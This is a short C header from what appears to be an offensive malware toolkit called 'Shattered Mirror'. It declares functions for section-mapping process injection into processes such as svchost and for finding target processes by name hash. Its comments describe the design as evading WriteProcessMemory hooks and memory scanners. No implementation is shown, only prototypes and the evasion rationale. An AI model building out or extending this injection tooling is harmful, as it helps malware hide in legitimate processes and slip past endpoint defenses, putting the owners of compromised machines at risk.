#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 08: Process Injection
 *
 * Implements Section-Based Map/View (NtCreateSection / NtMapViewOfSection)
 * process injection. This maps a payload into a target process (like svchost 
 * or RuntimeBroker) using shared memory sections, completely bypassing
 * WriteProcessMemory behavior hooks and Memory Scanners hunting for RWX.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_08_PROC_H
#define SMIRROR_ATOM_08_PROC_H

#include <windows.h>

/* Inject a payload into a specific PID using Section Mapping */
BOOL InjectPayloadSectionMap(DWORD dwTargetPid, const BYTE* pPayload, SIZE_T szPayloadSize);

/* Enumerate processes to find a target based on process name hash */
DWORD FindTargetProcess(DWORD dwProcNameHash);

#endif /* SMIRROR_ATOM_08_PROC_H */
